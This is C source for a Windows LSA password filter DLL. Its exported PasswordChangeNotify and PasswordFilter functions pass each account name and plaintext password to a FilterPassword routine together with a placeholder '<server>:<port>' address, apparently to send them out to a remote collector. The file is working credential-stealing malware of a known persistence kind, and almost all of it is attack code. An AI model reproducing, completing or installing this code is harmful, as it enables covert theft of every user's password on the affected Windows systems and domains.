#define _WIN32_WINNT 0x0501

#include "filter.h"
#include <windows.h>
#include <ntsecapi.h>

#define SERVER "<server>:<port>\0"

CRITICAL_SECTION cs;

void _() {
    FilterPassword(NULL, 0, NULL, 0, NULL);
}
__declspec(dllexport) BOOL NTAPI InitializeChangeNotify(void) { return TRUE; }

BOOL WINAPI DllMain(HINSTANCE hiDLL, DWORD dwReason, LPVOID lpReserved) { return TRUE; }

__declspec(dllexport) NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
    EnterCriticalSection(&cs);
    FilterPassword(SERVER, UserName->Length, (char*)(UserName->Buffer), NewPassword->Length, (char*)(NewPassword->Buffer));
    LeaveCriticalSection(&cs);
    return 0;
}
__declspec(dllexport) BOOL NTAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOL SetOperation) {
    FilterPassword(SERVER, AccountName->Length, (char*)(AccountName->Buffer), Password->Length, (char*)(Password->Buffer));
    return TRUE;
}
